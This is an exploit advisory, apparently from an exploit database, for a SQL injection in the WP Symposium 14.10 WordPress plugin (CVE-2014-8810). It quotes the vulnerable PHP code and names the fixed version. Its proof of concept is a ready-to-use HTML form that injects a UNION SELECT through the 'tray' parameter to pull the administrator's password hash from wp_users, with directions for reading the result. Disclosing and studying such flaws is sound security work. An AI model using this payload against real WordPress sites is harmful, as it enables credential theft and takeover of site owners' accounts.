@@ -1,0 +1,35 @@
+# Exploit Title: WP Symposium 14.10 SQL Injection
+# Date: 22-10-2014
+# Exploit Author: Kacper Szurek - http://security.szurek.pl/ http://twitter.com/KacperSzurek
+# Software Link: https://downloads.wordpress.org/plugin/wp-symposium.14.10.zip
+# Category: webapps
+# CVE: CVE-2014-8810
+  
+1. Description
+  
+$_POST['tray'] is not escaped.
+
+File: wp-symposium\ajax\mail_functions.php
+$tray = $_POST['tray'];
+$unread = $wpdb->get_var("SELECT COUNT(*) FROM ".$wpdb->base_prefix.'symposium_mail'." WHERE mail_from = ".$mail->mail_from." AND mail_".$tray."_deleted != 'on' AND mail_read != 'on'");
+
+http://security.szurek.pl/wp-symposium-1410-multiple-xss-and-sql-injection.html
+  
+2. Proof of Concept
+
+Message ID must be one of your sended message (you can check this on user mailbox page -> sent items -> page source -> div id="this_is_message_id" class="mail_item mail_item_unread")
+
+<form method="post" action="http://wordpress-instalation/wp-content/plugins/wp-symposium/ajax/mail_functions.php">
+    <input type="hidden" name="action" value="getMailMessage">
+    Message ID: <input type="text" name="mid"><br />
+    SQL: <input type="text" name="tray" value="in_deleted = 1 UNION (SELECT user_pass FROM wp_users WHERE ID=1) LIMIT 1, 1 -- ">
+    <input type="submit" value="Inject">
+</form>
+
+Returned value will be between "[split]YOUR_RETURNED_VALUE[split]"
+  
+3. Solution:
+  
+Update to version 14.11
+http://www.wpsymposium.com/2014/11/release-information-for-v14-11/
+https://downloads.wordpress.org/plugin/wp-symposium.14.11.zip
